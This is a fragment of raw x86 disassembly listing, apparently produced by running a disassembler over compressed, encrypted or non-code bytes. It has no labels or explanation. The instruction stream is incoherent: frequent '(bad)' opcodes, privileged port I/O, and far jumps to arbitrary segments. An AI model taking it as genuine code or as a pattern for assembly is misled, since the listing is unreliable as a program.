  4030e7:	mov    cl,0x7f
  4030e9:	mov    al,ds:0x8d8b81cd
  4030ee:	and    ah,BYTE PTR [ebx-0x79]
  4030f1:	stos   DWORD PTR es:[edi],eax
  4030f2:	lea    esp,[edx]
  4030f4:	call   0x62d672ef
  4030f9:	cmp    eax,0xcf862eb5
  4030fe:	hlt    
  4030ff:	outs   dx,BYTE PTR ds:[esi]
  403100:	mov    WORD PTR [edx+edx*4],ds
  403103:	fidiv  WORD PTR [edx]
  403105:	fst    QWORD PTR [ebp+0x4b1980ef]
  40310b:	dec    esp
  40310c:	in     eax,dx
  40310d:	push   0x53a5dc27
  403112:	mov    al,BYTE PTR [ebx+edx*1]
  403115:	js     0x4030af
  403117:	push   ss
  403118:	enter  0x751a,0x1d
  40311c:	mov    bh,0x72
  40311e:	or     DWORD PTR [esi+0x14],eax
  403121:	push   ds
  403122:	push   esp
  403123:	cwde   
  403124:	sbb    al,BYTE PTR [ecx]
  403126:	stc    
  403127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403128:	mov    ebx,ecx
  40312a:	loopne 0x403176
  40312c:	cmp    DWORD PTR [ebx],0x3457aedd
  403132:	dec    esi
  403133:	add    edi,ebp
  403135:	repnz push ebp
  403137:	outs   dx,BYTE PTR ds:[esi]
  403138:	call   0xefcf3dbd
  40313d:	retf   0x40ea
  403140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403141:	dec    eax
  403142:	aam    0x7
  403144:	push   es
  403145:	dec    ebp
  403146:	add    BYTE PTR [edi+0x37],0x14
  40314a:	xlat   BYTE PTR ds:[ebx]
  40314b:	jmp    0x4031c1
  40314d:	cmp    DWORD PTR [edi-0x57],edi
  403150:	adc    edx,ecx
  403152:	ret    
  403153:	and    al,0xc6
  403155:	adc    ebp,DWORD PTR [edi+0x2e786a6]
  40315b:	and    eax,0x9ca90227
  403160:	lods   eax,DWORD PTR ds:[esi]
  403161:	mul    BYTE PTR [ecx+0x17]
  403164:	daa    
  403165:	out    0x6f,al
  403167:	call   0x4f3be642
  40316c:	lock and ebx,edi
  40316f:	lahf   
  403170:	jae    0x4031d0
  403172:	gs out 0xcb,al
  403175:	pop    ds
  403176:	in     al,dx
  403177:	popf   
  403178:	mov    ecx,0x2571b120
  40317d:	ror    ecx,0x2c
  403180:	in     al,0xf
  403182:	add    BYTE PTR [ecx+0xda7c47],ah
  403188:	fisubr WORD PTR [ecx-0x65]
  40318b:	bound  ebp,QWORD PTR [eax]
  40318d:	stos   BYTE PTR es:[edi],al
  40318e:	in     eax,0x1e
  403190:	in     eax,dx
  403191:	in     eax,0xcb
  403193:	jns    0x40313a
  403195:	stos   BYTE PTR es:[edi],al
  403196:	cdq    
  403197:	push   edx
  403198:	stos   BYTE PTR es:[edi],al
  403199:	jmp    0xdc1f:0xc0c5710b
  4031a0:	adc    al,0x37
  4031a2:	out    0x2c,al
  4031a4:	loope  0x4031f2
  4031a6:	mov    cl,0x38
  4031a8:	dec    edi
  4031a9:	mov    edi,0x1e2f63e4
  4031ae:	in     al,dx
  4031af:	iret   
  4031b0:	or     eax,0xe1bfdb10
  4031b5:	fwait
  4031b6:	(bad)  
  4031b7:	clc    
  4031b8:	push   es
  4031b9:	ds retf 0x6c99
  4031bd:	sbb    DWORD PTR [esp+edx*4+0x1b],ebx
  4031c1:	rol    BYTE PTR [eax-0x4dc0567e],1
  4031c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031c8:	aas    
  4031c9:	loopne 0x403222
  4031cb:	jmp    0x29fd:0xccd36730
  4031d2:	inc    edi
  4031d3:	popa   
  4031d4:	mul    BYTE PTR [si-0x80]
  4031d8:	scas   eax,DWORD PTR es:[edi]
  4031d9:	into   
  4031da:	imul   esp,DWORD PTR [ebx],0x72a09ec0
  4031e0:	repnz retf 
  4031e2:	nop
  4031e3:	mov    al,ds:0xb238f7d6
  4031e8:	cwde   
  4031e9:	xor    dh,BYTE PTR [eax+0x1a]
  4031ec:	stos   BYTE PTR es:[edi],al
  4031ed:	ins    DWORD PTR es:[edi],dx
  4031ee:	jge    0x4031d2
  4031f0:	lock push ebp
  4031f2:	pop    ds
  4031f3:	xchg   eax,esi
  4031f5:	mov    eax,0x7f76735f
  4031fa:	mov    eax,0xda9d3423
  4031ff:	jns    0x403243
  403201:	jns    0x4031d2
  403203:	push   es
  403204:	xor    DWORD PTR [edi],0x1623aed4
  40320a:	or     al,BYTE PTR [ecx+0x76e0dd3]
  403210:	clc    
  403211:	dec    edx
  403212:	sbb    BYTE PTR [edi],ch
  403214:	loop   0x40320c
  403216:	xchg   DWORD PTR [ecx-0x4b],ebp
  403219:	lock sub eax,0x4048f6e9
  40321f:	mov    WORD PTR [edx],es
  403221:	jecxz  0x4031c9
  403223:	push   ecx
  403224:	cmp    eax,0x38c111e7
  403229:	jae    0x4031b6
  40322b:	mov    DWORD PTR [ecx+0x7dcd1cea],eax
  403231:	push   ss
  403232:	push   ebp
  403233:	pop    edx
  403234:	cdq    
  403235:	call   DWORD PTR [edx-0x13]
  403238:	or     ah,BYTE PTR [edi]
  40323a:	xchg   esi,eax
  40323b:	cmp    esp,ebx
  40323d:	jno    0x4031f1
  40323f:	sub    ebp,DWORD PTR [ecx-0x5014e7c5]
  403245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403246:	jecxz  0x40320a
  403248:	push   esp
  403249:	mov    ebp,ebx
  40324b:	inc    ecx
  40324c:	jmp    0x40329a
  40324e:	xchg   ebp,eax
  40324f:	clc    
  403250:	dec    eax
  403251:	mov    ecx,0x8c2d1610
  403256:	pop    ebx
  403257:	push   eax
  403258:	add    ah,0x73
  40325b:	xchg   BYTE PTR [esi+0x53],dl
  40325e:	push   edi
  40325f:	fwait
  403260:	inc    ebp
  403261:	mov    gs,WORD PTR [ebx-0x673180a8]
  403267:	cld    
  403268:	fucom  st(2)
  40326a:	add    eax,0x33af6fd8
  40326f:	and    al,0x1b
  403271:	repnz mov ah,BYTE PTR [ebx+0x15]
  403275:	ficomp WORD PTR [ebp+eiz*4-0x4152a676]
  40327c:	pop    esi
  40327d:	xor    ecx,DWORD PTR [ebx*2+0x7f565b63]
  403284:	std    
  403285:	ss xchg ecx,eax
  403287:	mov    ds:0x9b892da0,al
  40328c:	ffree  st(5)
  40328e:	hlt    
  40328f:	fisttp WORD PTR fs:[ecx+eiz*4+0x4816b77c]
  403297:	sub    bh,BYTE PTR [edx+0x48]
  40329a:	sub    al,0xa
  40329c:	mov    ds,esi
  40329e:	adc    BYTE PTR [eax],al
  4032a0:	adc    cl,BYTE PTR [edx+edx*4+0x60]
  4032a4:	iret   
  4032a5:	push   edx
  4032a6:	mov    ch,0x68
  4032a8:	fist   DWORD PTR ds:0xb3f5e2b2
  4032ae:	ins    BYTE PTR es:[edi],dx
  4032af:	test   al,0x3f
  4032b1:	sub    ebp,DWORD PTR fs:[esi+0x6ba9999b]
  4032b8:	dec    edi
  4032b9:	inc    esp
  4032ba:	adc    BYTE PTR ss:[ebx],ah
  4032bd:	cli    
  4032be:	scas   eax,DWORD PTR es:[edi]
  4032bf:	and    eax,0x5e124ca5
  4032c4:	ja     0x403294
  4032c6:	(bad)  
  4032c7:	fisttp WORD PTR [eax+ebx*2-0x15]
  4032cb:	aad    0xda
  4032cd:	mov    ecx,0x9496bfb4
  4032d2:	inc    esp
  4032d3:	mov    ecx,0xaca30793
  4032d8:	add    dh,BYTE PTR [esi+0x15]
  4032db:	xchg   ecx,eax
  4032dc:	ret    0x53d5
  4032df:	sbb    al,0x8
  4032e1:	in     al,dx
  4032e2:	jl     0x403314
  4032e4:	and    DWORD PTR [edx],ecx
  4032e6:	dec    esp
  4032e7:	sbb    BYTE PTR [eax+eiz*2-0x33dde10f],0x56
  4032ef:	ds js  0x403363
  4032f2:	mov    cl,0x52
  4032f4:	cmp    edx,ebp
  4032f6:	dec    eax
  4032f7:	sub    esi,DWORD PTR [ecx]
  4032f9:	and    edi,edi
  4032fb:	inc    ecx
  4032fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032fd:	jne    0x4032d0
  4032ff:	fist   DWORD PTR [eax-0x42309214]
  403305:	adc    DWORD PTR ds:0xeef004de,eax
  40330b:	push   0xd709a841
  403310:	mov    eax,ds:0x782032e9
  403315:	cld    
  403316:	repz (bad)
  403319:	mov    al,ds:0xd225e3c6
  40331e:	ds mov cl,0x9c
  403321:	xchg   ebp,eax
  403322:	and    DWORD PTR [ebx+0x4f],edx
  403325:	or     eax,0x3c837732
  40332a:	stc    
  40332b:	sbb    BYTE PTR [ecx-0x47],cl
  40332e:	xchg   ebp,eax
  40332f:	sub    al,0x35
  403331:	ret    0x6b59
  403334:	lea    ebx,[esi-0x7e]
  403337:	loope  0x403397
  403339:	mov    cl,0x16
  40333b:	jae    0x4032cd
  40333d:	ret    0x134c
  403340:	xchg   ecx,eax
  403341:	push   cs
  403342:	outs   dx,BYTE PTR ds:[esi]
  403343:	fisubr WORD PTR [ebx+0x241019e]
  403349:	inc    ebx
  40334a:	and    DWORD PTR [si-0x7d42],eax
  40334f:	xor    al,0x4
  403351:	jle    0x4032f9
  403353:	stos   BYTE PTR es:[edi],al
  403354:	in     al,0x0
  403356:	call   0x1d78:0x3f58d7bb
  40335d:	sbb    DWORD PTR [ebp+esi*8+0x7c],esi
  403361:	or     eax,DWORD PTR [ebp+0x9]
  403364:	jo     0x4033b1
  403366:	(bad)  [ebx]
  403368:	push   edx
  403369:	rcr    BYTE PTR [ecx+0x7c28effb],1
  40336f:	push   es
  403370:	ret    
  403371:	ret    
  403372:	mov    al,0x49
  403374:	ret    
  403375:	shr    ah,0xdb
  403378:	cmp    DWORD PTR ds:0x391797c8,ecx
  40337e:	xchg   ebx,eax
  40337f:	jns    0x4033d2
  403381:	push   ebp
  403382:	inc    edi
  403383:	push   es
  403384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403385:	dec    esi
  403386:	test   eax,0xfa139620
  40338b:	lds    edi,FWORD PTR [edi-0x23]
  40338e:	es mov dl,0x38
  403391:	mov    ah,cl
  403393:	enter  0x8c18,0x8e
  403397:	clc    
  403398:	sbb    al,0x3
  40339a:	imul   bp,WORD PTR [eax],0x1038
  40339f:	jl     0x403391
  4033a1:	pop    esp
  4033a2:	jb     0x40335a
  4033a4:	add    ebx,DWORD PTR [edi+edx*2-0x23]
  4033a8:	add    bl,BYTE PTR [ecx+edi*1+0x4f43c4c3]
  4033af:	aaa    
  4033b0:	cmc    
  4033b1:	lea    ebx,[eax-0x2f9fd089]
  4033b7:	inc    esp
  4033b8:	out    dx,eax
  4033b9:	fild   DWORD PTR [eax+eax*4-0x2a]
  4033bd:	adc    eax,ecx
  4033bf:	std    
  4033c0:	xor    ch,bl
  4033c2:	jne    0x403405
  4033c4:	xor    al,dl
  4033c6:	or     al,0xd8
  4033c8:	mov    ?,WORD PTR [ecx]
  4033ca:	cmp    al,0xd7
  4033cc:	sbb    BYTE PTR [ebp-0x36db65e4],dh
  4033d2:	mov    ch,0x64
  4033d4:	or     DWORD PTR [esi+0x1a],edi
  4033d7:	fwait
  4033d8:	gs call 0x7008fd3b
  4033de:	xchg   esp,eax
  4033df:	fwait
  4033e0:	jns    0x4033eb
  4033e2:	(bad)  [eax+0x1736a517]
  4033e8:	inc    BYTE PTR [ebx-0x24]
  4033eb:	inc    esi
  4033ec:	fs push si
  4033ef:	inc    ebx
  4033f0:	cmp    dh,BYTE PTR [esi-0x640927f6]
  4033f6:	and    eax,0x1405519e
  4033fb:	jmp    0x4033c4
  4033fd:	dec    ebx
  4033fe:	cdq    
  4033ff:	inc    eax
  403400:	mov    ah,0x5
  403402:	jge    0x4033e0
  403404:	lods   al,BYTE PTR ds:[esi]
  403405:	dec    edx
  403406:	jno    0x40347a
  403408:	gs jne 0x403433
  40340b:	sar    ebp,0x9b
  40340e:	outs   dx,DWORD PTR ds:[esi]
  40340f:	ja     0x4033b7
  403411:	sub    ch,ch
  403413:	leave  
  403414:	(bad)  
  403415:	ss sti 
  403417:	call   0xa0bd:0xf225022e
  40341e:	hlt    
  40341f:	push   ss
  403420:	sub    edi,ebp
  403422:	lea    esi,[ebx]
  403424:	xor    DWORD PTR ds:0x1d26023d,esi
  40342a:	data16 jmp 0x4033ed
  40342d:	(bad)  
  40342e:	js     0x403405
  403430:	mov    ebx,0x66385e3b
  403435:	std    
  403436:	dec    eax
  403437:	or     al,0x3d
  403439:	fimul  WORD PTR [ebx-0x20]
  40343c:	adc    BYTE PTR [ebp+0x77],dh
  40343f:	sub    BYTE PTR [edi+0x2275d998],bh
  403445:	enter  0xc8da,0x78
  403449:	sub    edi,edx
  40344b:	xchg   BYTE PTR [ebp-0x5a],bh
  40344e:	inc    DWORD PTR [edi+0x7d]
  403451:	xlat   BYTE PTR ds:[ebx]
  403452:	ss mov ebx,0x794c27cd
  403458:	fwait
  403459:	add    al,0x50
  40345b:	ficom  WORD PTR [esi]
  40345d:	mov    esp,0xb713b2fe
  403462:	sub    DWORD PTR ds:0x619c44bb,0x16
  403469:	in     al,dx
  40346a:	push   0xffffffcf
  40346c:	pop    ebp
  40346d:	hlt    
  40346e:	rcr    ebx,1
  403470:	sbb    BYTE PTR [edi+0x40],bh
  403473:	cmp    eax,edi
  403475:	test   al,0x1
  403477:	in     eax,dx
  403478:	dec    edi
  403479:	or     eax,0xa260a6be
  40347e:	test   eax,0x6a762fee
  403483:	xchg   ecx,eax
  403484:	xchg   edx,eax
  403485:	add    DWORD PTR [ecx-0x41],ebp
  403488:	mov    edx,0xf63a5385
  40348d:	sti    
  40348e:	jmp    0x4259638a
  403493:	xchg   DWORD PTR [esi+0x54bc5a29],edx
  403499:	call   0x8280f337
  40349e:	or     ebx,DWORD PTR [ecx-0x72]
  4034a1:	test   al,0x1a
  4034a3:	stos   BYTE PTR es:[edi],al
  4034a4:	cld    
  4034a5:	lods   al,BYTE PTR ds:[esi]
  4034a6:	jmp    0x403470
  4034a8:	sub    ebx,DWORD PTR [ecx-0xa0d4580]
  4034ae:	push   ss
  4034af:	xchg   edx,eax
  4034b0:	jmp    0x403495
  4034b2:	data16 lods al,BYTE PTR ds:[esi]
  4034b4:	scas   al,BYTE PTR es:[edi]
  4034b5:	ret    0x2d24
  4034b8:	mov    cl,0x73
  4034ba:	pop    ecx
  4034bb:	in     eax,dx
  4034bc:	dec    ecx
  4034bd:	jns    0x403472
  4034bf:	mov    dl,0xcb
  4034c1:	jp     0x4034cb
  4034c3:	(bad)  
  4034c4:	push   esi
  4034c5:	jmp    0x40349a
  4034c7:	out    dx,eax
  4034c8:	aam    0xbf
  4034ca:	dec    esp
  4034cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034cc:	les    edi,FWORD PTR [edi]
  4034ce:	adc    al,0xfe
  4034d0:	pop    esi
  4034d1:	arpl   WORD PTR [ebx+0x2e40eb88],di
  4034d7:	mov    dh,0x63
  4034d9:	sahf   
  4034da:	xlat   BYTE PTR ds:[ebx]
  4034db:	push   eax
  4034dc:	mov    esi,0xef81f168
  4034e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034e2:	mov    ds:0x1d6c3768,eax
  4034e7:	mov    dh,0x13
  4034e9:	sbb    BYTE PTR [esi+0x3a],ch
  4034ec:	dec    ebx
  4034ed:	mov    ah,0x3c
  4034ef:	sahf   
  4034f0:	xchg   BYTE PTR [ebp-0x11],bh
  4034f3:	xchg   ecx,eax
  4034f4:	shl    DWORD PTR ds:0x13e720b9,cl
  4034fa:	addr16 xchg edx,eax
  4034fc:	inc    eax
  4034fd:	xchg   esi,eax
  4034fe:	loop   0x4034f0
  403500:	int3   
  403501:	mov    esi,0x80522308
  403506:	push   ds
  403507:	sub    ebp,esi
  403509:	scas   eax,DWORD PTR es:[edi]
  40350a:	cdq    
  40350b:	into   
  40350c:	shl    DWORD PTR [esi+eax*2+0x1a68d96e],0x1d
  403514:	xchg   edi,eax
  403515:	aas    
  403516:	mov    ebp,DWORD PTR [edi+0x3a]
  403519:	test   edi,ecx
  40351b:	cmp    ebx,0xffffffa6
  40351e:	mov    eax,DWORD PTR [ecx+0x14]
  403521:	fild   QWORD PTR [edx]
  403523:	cmp    DWORD PTR [ebx+0x9c9b6bf],esi
  403529:	cmp    DWORD PTR [edi+0x46],ebp
  40352c:	scas   al,BYTE PTR es:[edi]
  40352d:	jmp    0xbc383904
  403532:	rol    BYTE PTR [edi+0x32df0107],0x4
  403539:	jl     0x4034f3
  40353b:	call   0xf5e29613
  403540:	cmp    al,0xcb
  403542:	and    BYTE PTR [ebx+0x2f],ch
  403545:	lds    edx,FWORD PTR [ecx]
  403547:	lods   eax,DWORD PTR ds:[esi]
  403548:	ret    0x4d35
  40354b:	and    eax,0xa6ecc473
  403550:	fs popf 
  403552:	repz mov dh,0xc6
  403555:	sub    ecx,DWORD PTR [edx]
  403557:	retf   
  403558:	push   0x9278f608
  40355d:	jmp    0x5267:0xf56475a1
  403564:	mov    al,ds:0xdc1f3afa
  403569:	mov    eax,0x7307990b
  40356e:	jmp    0xb996:0xa38dfcc7
  403575:	mov    cl,0x4c
  403577:	shl    DWORD PTR [edi-0x6a],cl
  40357a:	retf   0xedf0
  40357d:	js     0x403597
  40357f:	jno    0x403592
  403581:	cmp    ch,bh
  403583:	lods   al,BYTE PTR ds:[esi]
  403584:	mul    DWORD PTR [ebp+0x16f525ca]
  40358a:	mov    eax,0xc38fdc23
  40358f:	pushf  
  403590:	retf   0x5a77
  403593:	jge    0x40359a
  403595:	das    
  403596:	dec    edx
  403597:	stc    
  403598:	scas   al,BYTE PTR es:[edi]
  403599:	icebp  
  40359a:	xor    eax,DWORD PTR [esi-0x6308479f]
  4035a0:	(bad)  
  4035a1:	sti    
  4035a2:	nop
  4035a3:	aad    0xd2
  4035a5:	jg     0x403610
  4035a7:	int    0xd8
  4035a9:	sub    DWORD PTR ds:0x5e18d46f,edx
  4035af:	call   0xff88d136
  4035b4:	dec    eax
  4035b5:	pop    ebx
  4035b6:	clc    
  4035b7:	dec    esp
  4035b8:	sar    dh,cl
  4035ba:	(bad)  
  4035bb:	retf   
  4035bc:	jge    0x4035b0
  4035be:	mov    ecx,0x7505d151
  4035c3:	rol    DWORD PTR [ebx+0x37],cl
  4035c6:	cmp    al,0x2e
  4035c8:	dec    ebx
  4035c9:	sar    DWORD PTR ds:0xbc2b172c,0x1
  4035d0:	or     eax,0xf1953981
  4035d5:	xchg   ecx,eax
  4035d6:	adc    ah,BYTE PTR [ebx]
  4035d8:	xor    eax,0x87912997
  4035dd:	pop    ebp
  4035de:	jns    0x403579
  4035e0:	lds    ebx,FWORD PTR [ebx+0x61]
  4035e3:	cmp    DWORD PTR [edi-0x69695e73],edi
  4035e9:	nop
  4035ea:	cs mov ah,0x8f
  4035ed:	call   DWORD PTR [eax-0x13f8d7c1]
  4035f3:	and    eax,eax
  4035f5:	dec    ecx
  4035f6:	inc    edi
  4035f7:	or     ecx,ebx
  4035f9:	mov    ebp,0x9557b835
  4035fe:	add    al,ah
  403600:	mov    edi,cs
  403602:	je     0x403623
  403604:	cmp    ecx,edi
  403606:	cmp    ebp,0x77
  403609:	xchg   edi,eax
  40360a:	xchg   edx,eax
  40360b:	fs xchg esi,eax
  40360d:	mov    cl,0x8e
  40360f:	or     cl,BYTE PTR [eax+0x478361a]
  403615:	out    dx,eax
  403616:	push   ebx
  403617:	sub    BYTE PTR [edx],dh
  403619:	or     al,0x14
  40361b:	or     bh,ch
  40361d:	ret    
  40361e:	loopne 0x403698
  403620:	mov    ds:0x48d705aa,eax
  403625:	into   
  403626:	ss inc edi
  403628:	ret    
  403629:	or     al,0xda
  40362b:	jnp    0x40367f
  40362d:	xchg   esi,eax
  40362e:	imul   ebx,DWORD PTR [edi+0x54],0x26fcce57
  403635:	dec    edx
  403636:	cmp    BYTE PTR [ecx+0x239d15d6],dh
  40363c:	add    DWORD PTR [edi-0x68],0xf007c8ad
  403643:	push   edx
  403644:	mov    bl,0x33
  403646:	sbb    DWORD PTR [ebx-0x3e],0x975c3511
  40364d:	out    dx,eax
  40364e:	xchg   DWORD PTR [ebx+0x74],esi
  403651:	pop    ebx
  403652:	gs enter 0x72aa,0x5b
  403657:	xchg   ecx,eax
  403658:	push   eax
  403659:	adc    eax,DWORD PTR [ebx]
  40365b:	fs int 0x55
  40365e:	stos   DWORD PTR es:[edi],eax
  40365f:	inc    ebx
  403660:	push   0x937f8d7b
  403665:	fnstenv [ebx-0x6f]
  403668:	inc    edi
  403669:	test   eax,0xcf650fc9
  40366e:	scas   al,BYTE PTR es:[edi]
  40366f:	and    BYTE PTR [ecx+0x23],al
  403672:	or     dl,BYTE PTR [ecx]
  403674:	dec    edi
  403675:	push   esi
  403676:	cmp    DWORD PTR [esi],esi
  403678:	pushf  
  403679:	xchg   ebx,eax
  40367a:	ins    DWORD PTR es:[edi],dx
  40367b:	inc    esp
  40367c:	push   0x7051ead0
  403681:	loop   0x40364b
  403683:	sar    BYTE PTR [ecx+0x5d854e49],1
  403689:	in     al,0xb9
  40368b:	scas   eax,DWORD PTR es:[edi]
  40368c:	xor    bl,dh
  40368e:	dec    edi
  40368f:	test   BYTE PTR [ebp+eax*4-0x3a],dl
  403693:	(bad)  
  403694:	in     al,dx
  403695:	loopne 0x40363a
  403697:	lea    edi,[eax]
  403699:	mov    bl,dl
  40369b:	push   ss
  40369c:	div    BYTE PTR [esi]
  40369e:	cdq    
  40369f:	xor    BYTE PTR [edi+0x5b6927cd],0x78
  4036a6:	cs in  eax,dx
  4036a8:	jns    0x403657
  4036aa:	pop    ebx
  4036ab:	xchg   esi,eax
  4036ac:	in     al,dx
  4036ad:	dec    ebp
  4036ae:	mov    bl,0x8c
  4036b0:	dec    esi
  4036b1:	retf   
  4036b2:	fisttp WORD PTR [edx]
  4036b4:	xor    DWORD PTR [esi-0x1bfa7f0d],esp
  4036ba:	adc    eax,0xded436ac
  4036bf:	mov    bh,ah
  4036c1:	dec    edx
  4036c2:	aam    0x7a
  4036c4:	cmc    
  4036c5:	scas   eax,DWORD PTR es:[edi]
  4036c6:	adc    BYTE PTR [ecx-0x454f13ed],ch
  4036cc:	test   BYTE PTR [edi],ch
  4036ce:	cdq    
  4036cf:	icebp  
  4036d0:	adc    bh,BYTE PTR [eax-0x2b]
  4036d3:	int    0x65
  4036d5:	or     BYTE PTR [eax+0x7b],ah
  4036d8:	pop    ds
  4036d9:	xor    eax,0x1cf30f38
  4036de:	repz add cl,BYTE PTR [ebx+0x7e1f0fa5]
  4036e5:	jge    0x40371c
  4036e7:	shr    bh,cl
  4036e9:	outs   dx,BYTE PTR ds:[esi]
  4036ea:	mov    bl,0xc1
  4036ec:	cdq    
  4036ed:	cmp    ah,BYTE PTR [ecx]
  4036ef:	nop
  4036f0:	fdiv   DWORD PTR [ecx-0x77]
  4036f3:	xchg   esi,eax
  4036f4:	adc    cl,BYTE PTR [edx-0x19]
  4036f7:	jne    0x40368a
  4036f9:	mov    dl,0xab
  4036fb:	dec    esp
  4036fc:	push   ecx
  4036fd:	push   edi
  4036fe:	lods   al,BYTE PTR ds:[esi]
  4036ff:	and    DWORD PTR [edi-0x23cbe2fa],eax
  403705:	lahf   
  403706:	fldcw  WORD PTR [esp+edx*1]
  403709:	sub    ecx,ebp
  40370b:	enter  0xca0a,0x61
  40370f:	xor    eax,0xa6bdde97
  403714:	sbb    al,0x3
  403716:	aam    0x9
  403718:	xchg   ebp,eax
  403719:	ret    
  40371a:	in     eax,dx
  40371b:	call   0xd0ef56bf
  403720:	leave  
  403721:	mov    ds:0x9bcab4c1,eax
  403726:	cdq    
  403727:	sub    ebp,DWORD PTR [ebx+0x2f]
  40372a:	sti    
  40372b:	mov    ch,0xae
  40372d:	sub    ebp,DWORD PTR [eax-0x33]
  403730:	jo     0x4036c0
  403732:	icebp  
  403733:	ror    DWORD PTR [eax],1
  403735:	jp     0x4036f4
  403737:	mov    eax,ss
  403739:	sbb    eax,0xd5040535
  40373e:	ss xor ch,bl
  403741:	stos   DWORD PTR es:[edi],eax
  403742:	mov    dh,0xc6
  403744:	scas   al,BYTE PTR es:[edi]
  403745:	mov    dl,0x27
  403747:	inc    eax
  403748:	stc    
  403749:	dec    DWORD PTR [edx+0x5]
  40374c:	push   0x5840dbaf
  403751:	cs dec ecx
  403753:	test   DWORD PTR [eax-0x4b8ea1ac],esi
  403759:	add    eax,0xe0c10ee4
  40375e:	sbb    cl,bl
  403760:	xor    DWORD PTR [ecx-0x54],eax
  403763:	fnstenv [edi+0x3646246a]
  403769:	popf   
  40376a:	jmp    0x403701
  40376c:	add    DWORD PTR [edi],eax
  40376e:	pop    eax
  40376f:	(bad)  
  403770:	sbb    al,0xb
  403772:	inc    ecx
  403773:	cdq    
  403774:	mov    eax,0x8b0425dd
  403779:	icebp  
  40377a:	mov    ebx,0x3f09ae86
  40377f:	push   edx
  403780:	das    
  403781:	jo     0x403780
  403783:	add    BYTE PTR [edx+0x31],bh
  403786:	sub    DWORD PTR [edi],esp
  403788:	xchg   esp,eax
  403789:	cmp    esp,DWORD PTR [ebp-0x36]
  40378c:	or     BYTE PTR [ecx],al
  40378e:	cmp    cl,BYTE PTR [edi+esi*8]
  403791:	mov    esp,0xd0afe9ed
  403796:	jbe    0x4037c2
  403798:	(bad)  
  403799:	jne    0x403792
  40379b:	ins    DWORD PTR es:[edi],dx
  40379c:	sbb    eax,0xd78d42c0
  4037a1:	inc    ebp
  4037a2:	cmp    edx,DWORD PTR [edi-0x2d742e83]
  4037a8:	(bad)  
  4037a9:	(bad)  
  4037aa:	div    BYTE PTR [esp+edx*4-0x5db58509]
  4037b1:	jnp    0x403770
  4037b3:	cdq    
  4037b4:	outs   dx,DWORD PTR ds:[esi]
  4037b5:	pop    es
  4037b6:	fadd   QWORD PTR [edx-0x78]
  4037b9:	pop    esi
  4037ba:	pop    ecx
  4037bb:	scas   al,BYTE PTR es:[edi]
  4037bc:	lds    ecx,FWORD PTR [ebp-0x4b162000]
  4037c2:	jle    0x4037ff
  4037c4:	ret    
  4037c5:	enter  0x8ece,0x8e
  4037c9:	ds aam 0x81
  4037cc:	mov    cl,0xb6
  4037ce:	jb     0x403750
  4037d0:	stc    
  4037d1:	sar    DWORD PTR [ebx-0x7aa4b3f],1
  4037d7:	jae    0x403845
  4037d9:	push   ebp
  4037da:	das    
  4037db:	pop    ebp
  4037dc:	out    dx,eax
  4037dd:	(bad)  
  4037de:	ficom  WORD PTR [ebx-0x5f91d08c]
  4037e4:	dec    ebp
  4037e5:	gs popa 
  4037e7:	pushf  
  4037e8:	adc    al,0x61
  4037ea:	outs   dx,BYTE PTR ds:[esi]
  4037eb:	outs   dx,BYTE PTR ds:[esi]
  4037ec:	pop    eax
  4037ed:	popa   
  4037ee:	sub    BYTE PTR [eax],0x63
  4037f1:	mov    bh,0x96
  4037f3:	inc    ebp
  4037f4:	sbb    eax,0x3bba532a
  4037f9:	cmp    esp,eax
  4037fb:	xlat   BYTE PTR ds:[ebx]
  4037fc:	jo     0x4037d9
  4037fe:	push   ebp
  4037ff:	dec    edi
  403800:	call   0x92a23d57
  403805:	jl     0x4037a8
  403807:	push   ds
  403808:	jno    0x403821
  40380a:	dec    eax
  40380b:	test   al,0x9a
  40380d:	icebp  
  40380e:	jb     0x403795
  403810:	cdq    
  403811:	lods   al,BYTE PTR ds:[esi]
  403812:	fstp   QWORD PTR [ebp+0x74922dba]
  403818:	enter  0xdd15,0x98
  40381c:	clc    
  40381d:	and    eax,0x58212657
  403822:	adc    dh,ch
  403824:	jl     0x40386b
  403826:	cwde   
  403827:	aad    0x82
  403829:	(bad)  
  40382a:	xchg   esp,eax
  40382b:	inc    ecx
  40382c:	inc    ecx
  40382d:	movzx  ecx,BYTE PTR [esi+0x6a]
  403831:	pop    esi
  403832:	adc    al,0xe2
  403835:	inc    esp
  403836:	cs mov bl,0xd9
  403839:	cli    
  40383a:	and    DWORD PTR [edx+0x23],eax
  40383d:	ds test al,0x6c
  403840:	dec    eax
  403841:	xor    eax,0x6ad862
  403846:	jg     0x403899
  403848:	pop    es
  403849:	inc    edi
  40384a:	mov    esi,0x550ef963
  40384f:	call   0x8c58:0x9084657a
  403856:	mov    cl,0xe0
  403858:	sub    al,0xb
  40385a:	push   eax
  40385b:	adc    dl,BYTE PTR [ecx-0x23]
  40385e:	sub    edx,esp
  403860:	fbld   TBYTE PTR [edi+0x4d]
  403863:	lahf   
  403864:	repz or edi,DWORD PTR [edi+ecx*8+0x5e5b727a]
  40386c:	retf   0xae29
  40386f:	inc    esp
  403870:	mov    al,ds:0x7a0177bf
  403875:	out    0x36,eax
  403877:	dec    eax
  403878:	hlt    
  403879:	mov    cs,WORD PTR [edx]
  40387b:	sbb    al,0xe3
  40387d:	in     eax,dx
  40387e:	enter  0xcef2,0xc7
  403882:	mov    bl,0xa8
  403884:	xchg   esp,eax
  403885:	xor    al,0x79
  403887:	mov    ss,WORD PTR ds:0xbeee1e8e
  40388d:	mov    ah,0xd1
  40388f:	cmp    DWORD PTR [ebx-0x59],0x36
  403893:	mov    ?,ebp
  403895:	(bad)  
  403896:	hlt    
  403897:	and    esp,esp
  403899:	xor    ah,cl
  40389b:	call   0x7ed4397
  4038a0:	bound  ebx,QWORD PTR [esi]
  4038a2:	cmp    al,0xb3
  4038a4:	xor    cl,BYTE PTR [esp+edx*2-0x7cd1640a]
  4038ab:	push   ds
  4038ac:	icebp  
  4038ad:	out    0xe4,al
  4038af:	inc    ebx
  4038b0:	push   ecx
  4038b1:	sbb    ah,BYTE PTR [edi-0x72]
  4038b4:	pop    es
  4038b5:	popf   
  4038b6:	retf   0x8fab
  4038b9:	sub    BYTE PTR [eax-0x3],cl
